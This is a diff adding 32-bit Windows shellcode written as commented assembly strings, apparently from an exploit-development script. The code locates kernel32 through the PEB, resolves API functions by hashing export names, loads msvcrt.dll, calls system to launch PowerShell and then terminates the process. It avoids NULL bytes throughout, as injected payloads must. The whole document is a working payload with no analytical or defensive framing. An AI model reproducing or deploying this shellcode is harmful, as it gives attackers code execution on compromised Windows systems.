@@ -1,0 +1,120 @@
+    " start:                             "  #
+    #"   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov ebp, esp                    ;"  #
+    "   add esp, 0xfffff9f0             ;"  # Avoid NULL bytes by using 0xfffff9f0
+
+    " find_kernel32:                     "  #
+    "   xor   ecx, ecx                  ;"  #   ECX = 0
+    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
+    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
+    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
+    
+    " next_module:                       "  #
+    "   mov ebx, [esi+8h]               ;"  #   EBX = InInitOrder[X].base_address
+    "   mov edi, [esi+20h]              ;"  #   EDI = InInitOrder[X].module_name
+    "   mov esi, [esi]                  ;"  #   ESI = InInitOrder[X].flink (next)
+    "   cmp [edi+12*2], cx              ;"  #   (unicode) modulename[12] == 0x00 ?
+    "   jne next_module                 ;"  #   No: try next module.
+    
+    " find_function_shorten:             "  # 
+    "   jmp find_function_shorten_bnc   ;"  #   Short jump, will not have null bytes because these functions are close to each other, the JMP instruction’s opcodes will not contain NULL bytes
+    
+    " find_function_ret:                 "  # 
+    "   pop esi                         ;"  #   POP the return address from the stack 
+    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
+    "   jmp resolve_symbols_kernel32    ;"  # 
+    
+    " find_function_shorten_bnc:         "  # 
+    "   call find_function_ret          ;"  #   Relative CALL with negative offset
+    
+    " find_function:                     "  #
+    "   pushad                          ;"  #   Save all registers from base address of kernel32 is in EBX from previous step (find_kernel32)       
+    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
+    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
+    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
+    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
+    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
+    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
+    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later
+
+    " find_function_loop:                "  #
+    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
+    "   dec   ecx                       ;"  #   Decrement our names counter
+    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
+    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
+    "   add esi, ebx                    ;"  #   Set ESI to the VMA of the current symbol name
+    
+    " compute_hash:                      "
+    "   xor eax, eax                    ;"  # set EAX to NULL
+    "   cdq                             ;"  # CDQ uses EAX register null value to set EDX register to null as well
+    "   cld                             ;"  # Clear direction flag, df in the EFLAGS register
+    
+    " compute_hash_again:                "
+    "   lodsb                           ;"  # Load the next byte from esi into al
+    "   test al, al                     ;"  # Check for NULL terminator
+    "   jz compute_hash_finished        ;"  # If the ZF is set, we've hit the NULL term
+    "   ror edx, 0x0d                   ;"  # Rotate edx 13 bits to the right
+    "   add edx, eax                    ;"  # Add the new byte to the accumulator
+    "   jmp compute_hash_again          ;"  # Next iteration
+    
+    " compute_hash_finished:             "  # No instruction for this function, used as an indicator reached the end of the symbol name
+    
+    " find_function_compare:             "  #
+    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
+    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
+    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA 
+    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA 
+    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal 
+    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA 
+    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA 
+    "   mov   eax, [edx+4*ecx]          ;"  #   Get the target function's RVA 
+    "   add   eax, ebx                  ;"  #   Get the target function's VMA 
+    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
+
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+    
+    " resolve_symbols_kernel32:              " 
+    "   push  0x78b5b983                ;"  #   TerminateProcess hash 
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function 
+    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage 
+    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
+    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
+
+    " load_msvcrt:                       "  #   6D 73 76 63 72 74 2E 64 6C 6C (msvcrt.dll)
+    "   xor ecx, ecx                    ;"  #   Null ECX 
+    "   push ecx                        ;"  #   Push a NULL byte
+    "   mov cx, 0x6c6c                  ;"  #   6C 6C Negative Hex Representation of the string ll
+    "   push ecx                        ;"  #
+    "   push 0x642e7472                 ;"  #   72 74 2E 64 Hex value of string "rt.d"
+    "   push 0x6376736d                 ;"  #   6D 73 76 63 Hex value of string "msvc"
+    "   push esp                        ;"  #   Push the stack ptr to pt to the string "msvcrt.dll"
+    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA 
+
+    " resolve_symbols_msvcrt:            "  #  
+    "   mov ebx, eax                    ;"  #   Move the base address of msvcrt.dll to EBX
+    "   xor ecx, ecx                    ;"  #   Null EAX 
+    "   push 0x692fada7                 ;"  #   Hash for the function "system"
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function to loop and find system
+    "   mov [ebp+0x1c], eax             ;"  #   Save system address for later usage
+    
+    " call_system:                       "  #         
+    "   xor ecx, ecx                    ;"  #   Null EAX
+    "   push ecx                        ;"  #   Push a NULL terminator 
+    "   mov cx, 0x6c6c                  ;"  #
+    "   push ecx                        ;"  #
+    "   push 0x65687372                 ;"  #   rshe (72 73 68 65)
+    "   push 0x65776F70                 ;"  #   Powe (70 6F 77 65)
+    "   push esp                        ;"  #   Push the pointer to the command onto the stack
+    "   call dword ptr [ebp+0x1c]       ;"  #   Call system
+
+    " call_terminateprocess:             "  #
+    "   xor   ecx, ecx                  ;"  #   NULL ECX
+    "   push  ecx                       ;"  #   Push uExitCode
+    "   push  0xffffffff                ;"  #   Push hProcess
+    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
